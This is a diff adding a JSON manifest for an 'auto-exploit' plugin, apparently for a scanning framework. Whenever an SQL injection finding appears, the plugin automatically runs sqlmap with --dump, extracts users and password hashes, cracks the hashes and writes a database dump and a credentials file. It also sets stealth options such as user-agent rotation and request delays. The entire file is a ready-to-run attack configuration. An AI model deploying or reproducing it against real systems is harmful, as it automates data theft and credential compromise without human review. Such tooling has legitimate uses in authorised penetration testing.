@@ -1,0 +1,48 @@
+{
+  "name": "kobra-plugin-sqlmap-auto",
+  "version": "1.0.0",
+  "author": "shenyo1",
+  "description": "Auto-exploit SQLi findings via sqlmap subprocess. Outputs DB dump + creds.",
+  "category": "Exploit",
+  "engine_version": ">=4.4.0",
+  "patterns": [
+    {
+      "kind": "trigger",
+      "value": "sqli.finding.detected",
+      "severity_hint": "High"
+    }
+  ],
+  "config": {
+    "binary": "sqlmap",
+    "args": [
+      "-u", "{target}",
+      "--batch",
+      "--random-agent",
+      "--level=3",
+      "--risk=2",
+      "--threads=4",
+      "--timeout=30",
+      "--retries=2",
+      "--output-dir=/tmp/kobra-sqlmap/{engagement_id}",
+      "--dump",
+      "--exclude-sysdbs"
+    ],
+    "timeout_secs": 600,
+    "post_actions": [
+      "extract_dbs",
+      "extract_users",
+      "extract_hashes",
+      "crack_hashes"
+    ],
+    "stealth": {
+      "tor_proxy": false,
+      "delay_between_requests": 0.5,
+      "user_agent_rotation": true
+    }
+  },
+  "outputs": {
+    "db_dump": "{output_dir}/*/dump.sql",
+    "creds": "{output_dir}/*/users.csv",
+    "log": "{output_dir}/sqlmap.log"
+  }
+}
